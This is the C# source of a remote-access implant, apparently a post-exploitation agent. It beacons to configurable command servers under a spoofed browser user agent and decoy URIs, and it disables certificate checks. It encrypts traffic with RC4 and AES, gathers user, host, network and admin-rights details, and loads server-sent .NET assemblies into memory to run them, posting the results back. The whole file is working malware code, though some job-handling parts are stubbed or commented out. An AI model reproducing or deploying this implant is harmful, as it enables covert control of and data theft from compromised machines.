using System;
using System.Text;
using System.Net;
using System.Linq;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Diagnostics;
using System.Reflection;
using System.Collections.Generic;
using System.Threading;
using System.IO;
using System.IO.Compression;
using System.Runtime.Remoting.Messaging;

namespace Agent
{
    public class Agent
    {
        private static int agentDeley = 5;
        private static int agentJitty = 0;
        private static string profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
        private static int lostLimit = 60;
        private static string defaultResponse = "PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgU3RyaWN0Ly9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL3hodG1sMS9EVEQveGh0bWwxLXN0cmljdC5kdGQiPgo8aHRtbCB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCI+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1pc28tODg1OS0xIi8+Cjx0aXRsZT40MDQgLSBGaWxlIG9yIGRpcmVjdG9yeSBub3QgZm91bmQuPC90aXRsZT4KPHN0eWxlIHR5cGU9InRleHQvY3NzIj4KPCEtLQpib2R5e21hcmdpbjowO2ZvbnQtc2l6ZTouN2VtO2ZvbnQtZmFtaWx5OlZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7YmFja2dyb3VuZDojRUVFRUVFO30KZmllbGRzZXR7cGFkZGluZzowIDE1cHggMTBweCAxNXB4O30KaDF7Zm9udC1zaXplOjIuNGVtO21hcmdpbjowO2NvbG9yOiNGRkY7fQpoMntmb250LXNpemU6MS43ZW07bWFyZ2luOjA7Y29sb3I6I0NDMDAwMDt9Cmgze2ZvbnQtc2l6ZToxLjJlbTttYXJnaW46MTBweCAwIDAgMDtjb2xvcjojMDAwMDAwO30KI2hlYWRlcnt3aWR0aDo5NiU7bWFyZ2luOjAgMCAwIDA7cGFkZGluZzo2cHggMiUgNnB4IDIlO2ZvbnQtZmFtaWx5OiJ0cmVidWNoZXQgTVMiLCBWZXJkYW5hLCBzYW5zLXNlcmlmO2NvbG9yOiNGRkY7CmJhY2tncm91bmQtY29sb3I6IzU1NTU1NTt9CiNjb250ZW50e21hcmdpbjowIDAgMCAyJTtwb3NpdGlvbjpyZWxhdGl2ZTt9Ci5jb250ZW50LWNvbnRhaW5lcntiYWNrZ3JvdW5kOiNGRkY7d2lkdGg6OTYlO21hcmdpbi10b3A6OHB4O3BhZGRpbmc6MTBweDtwb3NpdGlvbjpyZWxhdGl2ZTt9Ci0tPgo8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5Pgo8ZGl2IGlkPSJoZWFkZXIiPjxoMT5TZXJ2ZXIgRXJyb3I8L2gxPjwvZGl2Pgo8ZGl2IGlkPSJjb250ZW50Ij4KIDxkaXYgY2xhc3M9ImNvbnRlbnQtY29udGFpbmVyIj48ZmllbGRzZXQ+CiAgPGgyPjQwNCAtIEZpbGUgb3IgZGlyZWN0b3J5IG5vdCBmb3VuZC48L2gyPgogIDxoMz5UaGUgcmVzb3VyY2UgeW91IGFyZSBsb29raW5nIGZvciBtaWdodCBoYXZlIGJlZW4gcmVtb3ZlZCwgaGFkIGl0cyBuYW1lIGNoYW5nZWQsIG9yIGlzIHRlbXBvcmFyaWx5IHVuYXZhaWxhYmxlLjwvaDM+CiA8L2ZpZWxkc2V0PjwvZGl2Pgo8L2Rpdj4KPC9ib2R5Pgo8L2h0bWw+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA==";
        private static string killData = "";
        private static int killDays = 3600;
        private static string workingHours = "";
        private static string servers = "";
        private static string stagingKey = "";
        private static byte[] sessionKey = null;
        private static string sessionID = "";
        private static string[] profileParts = profile.Split('|');
        private static string[] taskURIs = profileParts[0].Split(',');
        private static string userAgent = profileParts[1];
        private static Random rd = new Random();
        private static Encoding encoding = Encoding.ASCII;
        private static Dictionary<string, IAsyncResult> jobs = new Dictionary<string, IAsyncResult>();
        private static Dictionary<string, int> resultIDs = new Dictionary<string, int>();


        public static void Execute(string servers, string stagingKey, byte[] sessionKey, string sessionID)
        {
            Agent.servers = servers;
            Agent.stagingKey = stagingKey;
            Agent.sessionKey = sessionKey;
            Agent.sessionID = sessionID;
            defaultResponse = Encoding.UTF8.GetString(Convert.FromBase64String(defaultResponse));

            Encoding encoding = Encoding.ASCII;
            HMACSHA256 hmac = new HMACSHA256();
            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };

            while (true)
            {
                if (true)
                {
                    byte[] packets = null;

                    //foreach (string jobName in jobs.Keys)
                    //{
                    //    string results = StopAgentJob(jobName);
                    //    int jobResultID = resultIDs[jobName];
                    //    packets = packets.Concat(EncodePacket(110, results, jobResultID)).ToArray();
                    //    resultIDs.Remove(jobName);
                    //}
                    //if (packets != null)
                    //{
                    //    SendMessage(packets);
                    //}
                }

                if (agentDeley != 0)
                {
                    int sleepMin = (1 - agentJitty) * agentDeley;
                    int sleepMax = (1 + agentJitty) * agentDeley;
                    int sleepTime;
                    if (sleepMin == sleepMax)
                    {
                        sleepTime = sleepMin;
                    }
                    else
                    {
                        sleepTime = rd.Next(sleepMin, sleepMax);
                    }
                    Thread.Sleep(sleepTime * 1000);
                }

                //byte[] jobResults = null;
                //foreach (string jobName in jobs.Keys)
                //{
                //    int jobResultID = resultIDs[jobName];
                //    string results = null;
                //    if (GetAgentJobCompleted(jobName))
                //    {
                //        results = StopAgentJob(jobName);
                //    }
                //    else
                //    {
                //        results = ReceiveAgentJob(jobName);
                //    }
                //    if (results.Length > 0)
                //    {
                //        jobResults = jobResults.Concat(EncodePacket(110, results, jobResultID)).ToArray();
                //    }
                //}
                //if (jobResults != null)
                //{
                //    SendMessage(jobResults);
                //}

                byte[] taskData = GetTask();
                if (taskData != null)
                {
                    if (Encoding.UTF8.GetString(taskData).Trim() != defaultResponse.Trim())
                    {
                        DecodeRoutingPacket(taskData);
                    }
                }
                GC.Collect();
            }
        }

        private static byte[] ProcessTasking(int type, string msg, int resultID)
        {
            //todo
            if (type == 100)
            {
                StartAgentJob(type, msg, resultID);
                return EncodePacket(type, $"task ID {resultID} started", resultID);
            }
            else if (type == 101)
            {
                SendMessage(EncodePacket(type, $"task ID {resultID} started", resultID));
                String result=StartAgentTask(type, msg, resultID);
                return EncodePacket(type, result, resultID);
            }
            else if (type == 50)
            {
                String result = "";
                foreach (string jobName in jobs.Keys)
                {
                    result += jobName + "\r\n";
                }
                return EncodePacket(type, $"Running Jobs:\r\n{result}", resultID);
            }
            else if (type == 51)
            {
                StopAgentJob(msg, resultID);
                return EncodePacket(type, $"Jobs stopped", resultID);
            }
            else {
                return EncodePacket(type, $"task ID {resultID} type invalid", resultID);
            }
        }
        private static void ProcessTaskingPackets(byte[] tasking)
        {
            byte[] taskingBytes = DecryptBytes(tasking);
            if (taskingBytes == null)
            {
                return;
            }
            object[] decoded = DecodePacket(taskingBytes);
            int type = Convert.ToInt32(decoded[0]);
            int totalPackets = Convert.ToInt32(decoded[1]);
            int packetNum = Convert.ToInt32(decoded[2]);
            int taskID = Convert.ToInt32(decoded[3]);
            int length = Convert.ToInt32(decoded[4]);
            string data = Convert.ToString(decoded[5]);
            string remaining = Convert.ToString(decoded[6]);
            byte[] resultPackets = ProcessTasking(type, data, taskID);

            int offset = 12 + length;
            while (remaining.Length != 0)
            {
                decoded = DecodePacket(taskingBytes, offset);
                type = Convert.ToInt32(decoded[0]);
                totalPackets = Convert.ToInt32(decoded[1]);
                packetNum = Convert.ToInt32(decoded[2]);
                taskID = Convert.ToInt32(decoded[3]);
                length = Convert.ToInt32(decoded[4]);
                data = Convert.ToString(decoded[5]);
                if (decoded.Length == 7) remaining = Convert.ToString(decoded[6]);
                resultPackets = resultPackets.Concat(ProcessTasking(type, data, taskID)).ToArray();
                offset += (12 + length);
            }
            SendMessage(resultPackets);

        }
        private static byte[] GetTask()
        {
            try
            {
                byte[] routingPacket = NewRoutingPacket(null, 4);
                string routingCookie = Convert.ToBase64String(routingPacket);
                WebClient wc = new WebClient();
                wc.Proxy = WebRequest.GetSystemWebProxy();
                wc.Proxy.Credentials = CredentialCache.DefaultCredentials;
                wc.Headers.Add("User-Agent", userAgent);
                wc.Headers.Add("Cookie", "=" + routingCookie);
                byte[] result = wc.DownloadData(servers + taskURIs[rd.Next(0, taskURIs.Length - 1)]);
                return result;
            }
            catch
            {
                return null;
            }
        }
        private static bool GetAgentJobCompleted(string jobName)
        {
            if (jobs.ContainsKey(jobName))
            {
                return true;
            }
            return false;
        }
        private static void SendMessage(byte[] packets)
        {
            if (packets != null)
            {
                byte[] encBytes = EncryptBytes(packets);
                byte[] routingPacket = NewRoutingPacket(encBytes, 5);
                WebClient wc = new WebClient();
                wc.Proxy = WebRequest.GetSystemWebProxy();
                wc.Proxy.Credentials = CredentialCache.DefaultCredentials;
                wc.Headers.Add("User-Agent", userAgent);
                try
                {
                    wc.UploadData(servers + taskURIs[rd.Next(0, taskURIs.Length - 1)], "POST", routingPacket);
                }
                catch
                {
                }
            }
        }

        private static void StartAgentJob(int type, string payload, int resultID)
        {
            string output = "";
            byte[] jobName = new byte[6];
            string saveFilePrefix = "";
            string extention = "";
            rd.NextBytes(jobName);
            jobName = encoding.GetBytes(jobName.Select(c => "ABCDEFGHKLMNPRSTUVWXYZ123456789".ToCharArray()[c % 31]).ToArray());
            try
            {
                string[] pieces = payload.Split(',');
                if (type == 101)
                {
                    saveFilePrefix = pieces[0].Substring(0, 15);
                    extention = pieces[0].Substring(15, 5);
                    pieces[0] = pieces[0].Substring(20);
                }
                if (pieces.Length > 0)
                {
                    object[] parameters = null;
                    if (pieces.Length > 1)
                    {
                        parameters = new object[pieces.Length - 1];
                    }
                    for (int i = 1; i < pieces.Length; i++)
                    {
                        parameters[i - 1] = Encoding.UTF8.GetString(Convert.FromBase64String(pieces[i]));
                        //Console.WriteLine(parameters[i - 1]);
                    }
                    ExecuteJob exJob = new ExecuteJob((a, p) => {
                        try
                        {
                            byte[] ca = Convert.FromBase64String(a);
                            byte[] da = Decompress(ca);
                            Assembly jobTask = Assembly.Load(da);
                            return jobTask.GetType("Task").GetMethod("Execute").Invoke(null, p);
                        }
                        catch (Exception e)
                        {
                            String resultString = "Task Exception: " + e.Message + Environment.NewLine + e.StackTrace;
                            SendMessage(EncodePacket(type, resultString, resultID));
                            return null;
                        }

                    });
                    IAsyncResult result = exJob.BeginInvoke(pieces[0], parameters, ExecuteJobCallback, new string[] { type.ToString(), resultID.ToString(), saveFilePrefix, extention, Encoding.UTF8.GetString(jobName) });
                    jobs.Add(Encoding.UTF8.GetString(jobName), result);
                }
            }
            catch (Exception e)
            {
                String resultString = "Task Exception: " + e.Message + Environment.NewLine + e.StackTrace;
                SendMessage(EncodePacket(type, resultString, resultID));
            }
        }

        private static void ExecuteJobCallback(IAsyncResult iAsyncResult)
        {
            AsyncResult result = (AsyncResult)iAsyncResult;
            ExecuteJob exJob = (ExecuteJob)result.AsyncDelegate;
            int type = int.Parse(((string[])iAsyncResult.AsyncState)[0]);
            int resultID = int.Parse(((string[])iAsyncResult.AsyncState)[1]);
            string saveFilePrefix = ((string[])iAsyncResult.AsyncState)[2];
            string extention = ((string[])iAsyncResult.AsyncState)[3];
            string jobName = ((string[])iAsyncResult.AsyncState)[4];
            string resultString = Convert.ToString(exJob.EndInvoke(iAsyncResult));
            byte[] resultPackets = EncodePacket(type, saveFilePrefix + extention + resultString, resultID);
            SendMessage(resultPackets);
            jobs.Remove(jobName);
        }

        private delegate object ExecuteJob(string assamebly, object[] parameters);
        private static string StopAgentJob(string jobName,int resultID)
        {
            
            jobs.Remove(jobName);
            return null;
        }
        private static string ReceiveAgentJob(string jobName)
        {
            if (jobs.ContainsKey(jobName))
            {
                return null;
            }
            return null;
        }
        private static byte[] ConvertToRC4ByteStream(byte[] input, byte[] rck)
        {
            byte[] str = Enumerable.Range(0, 256).Select(c => Convert.ToByte(c)).ToArray();
            int j = 0;
            int i = 0;
            for (; i < str.Length; i++)
            {
                j = (j + str[i] + rck[i % rck.Length]) % 256;
                byte tmp = str[i];
                str[i] = str[j];
                str[j] = tmp;
            }
            i = j = 0;
            byte[] buffer = new byte[input.Length];
            foreach (byte b in input)
            {
                i = (i + 1) % 256;
                j = (j + str[i]) % 256;
                byte tmp = str[i];
                str[i] = str[j];
                str[j] = tmp;
                buffer[i - 1] = (byte)(b ^ str[(str[i] + str[j]) % 256]);
            }
            return buffer;
        }

        private static string GetHexString(byte[] data)
        {
            return BitConverter.ToString(data).Replace("-", "");
        }

        private static string GetSysinfo()
        {
            string str = "0|" + Agent.servers + "|" + Environment.UserDomainName + "|" + Environment.UserName + "|" + Environment.MachineName;
            IPAddress[] p = Dns.GetHostAddresses(Dns.GetHostName());

            try
            {
                str = str + "|";
                foreach (IPAddress pp in p)
                {
                    str = str + pp.ToString() + " ";
                }
            }
            catch
            {
                str = str + "|" + "[FAILED]";
            }

            str = str + "|" + Environment.OSVersion.VersionString;

            if (Environment.UserName.ToLower() == "system")
            {
                str += "|True";
            }
            else
            {
                str += "|" + new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
            }

            Process n = Process.GetCurrentProcess();
            str += "|" + n.ProcessName + "|" + n.Id;
            str += "|.net|" + Environment.Version.ToString();
            return str;
        }

        private static byte[] NewRoutingPacket(byte[] encData, int meta)
        {
            int encDataLen;
            if (encData != null)
            {
                encDataLen = encData.Length;
            }
            else
            {
                encDataLen = 0;
            }
            byte[] skb = encoding.GetBytes(stagingKey);
            byte[] iv = BitConverter.GetBytes(rd.Next(int.MaxValue));
            byte[] data = encoding.GetBytes(sessionID).Concat(new byte[4] { 0x01, (byte)meta, 0x00, 0x00 }).Concat(BitConverter.GetBytes(encDataLen)).ToArray();
            byte[] routingPacketData = ConvertToRC4ByteStream(data, iv.Concat(skb).ToArray());
            if (encData != null)
            {
                return iv.Concat(routingPacketData).Concat(encData).ToArray();
            }
            else
            {
                return iv.Concat(routingPacketData).ToArray();
            }
        }
        private static void DecodeRoutingPacket(byte[] packetData)
        {
            if (packetData.Length >= 20)
            {
                int offset = 0;
                while (offset < packetData.Length)
                {
                    byte[] routingPacket = packetData.Skip(offset + 0).Take(20).ToArray();
                    byte[] routingIV = routingPacket.Take(4).ToArray();
                    byte[] routingEncData = routingPacket.Skip(4).ToArray();
                    offset += 20;

                    byte[] skb = encoding.GetBytes(stagingKey);
                    byte[] routingData = ConvertToRC4ByteStream(routingEncData, routingIV.Concat(skb).ToArray());
                    string packetSessionID = Encoding.UTF8.GetString(routingData.Take(8).ToArray());
                    uint packetLength = BitConverter.ToUInt32(routingData, 12);

                    if (packetLength <= 0)
                    {
                        break;
                    }
                    if (packetSessionID == sessionID)
                    {
                        byte[] encData = packetData.Skip(offset).Take((int)packetLength).ToArray();
                        offset += (int)packetLength;
                        ProcessTaskingPackets(encData);
                    }
                    else
                    {
                    }
                }
            }
        }
        private static byte[] EncodePacket(int type, string data, int resultID = 0)
        {
            string result = Convert.ToBase64String(Encoding.UTF8.GetBytes(data));
            byte[] packet = new byte[12 + result.Length];
            BitConverter.GetBytes(type).CopyTo(packet, 0);
            BitConverter.GetBytes((Int16)1).CopyTo(packet, 2);
            BitConverter.GetBytes((Int16)1).CopyTo(packet, 4);
            BitConverter.GetBytes(resultID).CopyTo(packet, 6);
            BitConverter.GetBytes(result.Length).CopyTo(packet, 8);
            Encoding.UTF8.GetBytes(result).CopyTo(packet, 12);
            return packet;
        }
        private static object[] DecodePacket(byte[] packet, int offset = 0)
        {
            uint type = BitConverter.ToUInt16(packet, 0 + offset);
            uint totalPackets = BitConverter.ToUInt16(packet, 2 + offset);
            uint packetNum = BitConverter.ToUInt16(packet, 4 + offset);
            uint taskID = BitConverter.ToUInt16(packet, 6 + offset);
            uint length = BitConverter.ToUInt32(packet, 8 + offset);
            string data = Encoding.UTF8.GetString(packet.Skip(12 + offset).Take((int)length).ToArray());
            string remaining = Encoding.UTF8.GetString(packet.Skip(12 + offset + (int)length).ToArray());
            return new object[] { type, totalPackets, packetNum, taskID, length, data, remaining };
        }
        private static byte[] EncryptBytes(byte[] bytes)
        {
            byte[] iv = new byte[16];
            rd.NextBytes(iv);
            AesCryptoServiceProvider aes = new AesCryptoServiceProvider();
            aes.Mode = CipherMode.CBC;
            aes.Key = sessionKey;
            aes.IV = iv;
            byte[] cipherText = iv.Concat(aes.CreateEncryptor().TransformFinalBlock(bytes, 0, bytes.Length)).ToArray();
            HMACSHA256 hmac = new HMACSHA256();
            hmac.Key = sessionKey;
            return cipherText.Concat(hmac.ComputeHash(cipherText).Take(10)).ToArray();
        }
        private static byte[] DecryptBytes(byte[] bytes)
        {
            if (bytes.Length > 32)
            {
                HMACSHA256 hmac = new HMACSHA256();
                Encoding e = Encoding.ASCII;
                byte[] mac = bytes.Skip(bytes.Length - 10).ToArray();
                byte[] tmp = bytes.Take(bytes.Length - 10).ToArray();
                hmac.Key = sessionKey;
                byte[] expected = hmac.ComputeHash(tmp.ToArray()).Take(10).ToArray();
                if (!mac.SequenceEqual(expected))
                {
                    return null;
                }
                byte[] iv = tmp.Take(16).ToArray();
                var aes = new AesCryptoServiceProvider();
                aes.Mode = CipherMode.CBC;
                aes.Key = sessionKey;
                aes.IV = iv;
                return aes.CreateDecryptor().TransformFinalBlock(tmp.Skip(16).ToArray(), 0, tmp.ToArray().Length - 16);
            }
            return null;
        }
        private static byte[] Decompress(byte[] compressed)
        {
            using (MemoryStream inputStream = new MemoryStream(compressed.Length))
            {
                inputStream.Write(compressed, 0, compressed.Length);
                inputStream.Seek(0, SeekOrigin.Begin);
                using (MemoryStream outputStream = new MemoryStream())
                {
                    using (DeflateStream deflateStream = new DeflateStream(inputStream, CompressionMode.Decompress))
                    {
                        byte[] buffer = new byte[4096];
                        int bytesRead;
                        while ((bytesRead = deflateStream.Read(buffer, 0, buffer.Length)) != 0)
                        {
                            outputStream.Write(buffer, 0, bytesRead);
                        }
                    }
                    return outputStream.ToArray();
                }
            }
        }
    }
}